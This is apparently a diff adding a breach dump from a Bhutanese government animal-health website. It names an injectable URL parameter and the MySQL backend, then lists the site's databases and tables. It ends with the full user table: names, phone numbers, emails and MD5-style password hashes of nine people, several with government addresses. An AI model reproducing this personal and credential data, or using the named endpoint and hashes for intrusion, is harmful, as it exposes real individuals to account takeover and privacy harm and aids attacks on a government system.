@@ -1,0 +1,51 @@
+.gov government
+
+.bt Bhutan
+
+ISP 	DRUKNET A1
+
+National Centre for Animal Health
+
+Department Of Livestock Ministry Of Agriculture And Forests Government Of Bhutan 
+
+https://www.ncah.gov.bt/newsdetails.php?ID=516
+
+the back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+
+available databases [2]:
+[+] information_schema
+[+] ncah
+
+Database: ncah
+[12 tables]
++----------------+
+| counter_ips    |
+| counter_values |
+| slide_items    |
+| tblanmal       |
+| tblcomments    |
+| tbldepartment  |
+| tbldisease     |
+| tbldreporting  |
+| tblnews        |
+| tblprofile     |
+| tblupload      |
+| tbluser        |
++----------------+
+
+Database: ncah
+Table: tbluser
+[9 entries]
++------------+--------------------+--------------------------------+----------------------------------+
+| fldMobile  | fldName            | fldEmail                       | fldPassw                         |
++------------+--------------------+--------------------------------+----------------------------------+
+| 17960168   | Developer          | govindaghr@yahoo.com           | 27cc3d7fabec4f4a24f98bc7e07d98f4 |
+| 12345678   | General User       | govinda1@yahoo.com             | 27cc3d7fabec4f4a24f98bc7e07d98f4 |
+| 17520756   | Tshering           | karmatseeringdorji@hotmail.com | 8c6b237b43a0c3ac51a2c4d8c2fb6ea8 |
+| 17614398   | Lokey Thapa        | lokayt@ncah.gov.bt             | ff40c20fb68274fa2f91881ba68ef02e |
+| 17617559   | Karma Dekar        | karma_de@yahoo.com             | ac60b19f88965c08b246862336431f04 |
+| 17636260   | Dr Tenzin          | tenzinvp@gmail.com             | 3fd4892fbf0d687539e73cf027d4dde6 |
+| 17614398   | Lokey Thapa        | lthapa@moaf.gov.bt             | ff40c20fb68274fa2f91881ba68ef02e |
+| 6969696969 | Admin              | no-reply1@domain.com           | ff40c20fb68274fa2f91881ba68ef02e |
+| 17887913   | Dr Palden Wangchuk | paldenw@moaf.gov.bt            | e51d4f11fb32c3c1fcb106f593a37154 |
++------------+--------------------+--------------------------------+----------------------------------+
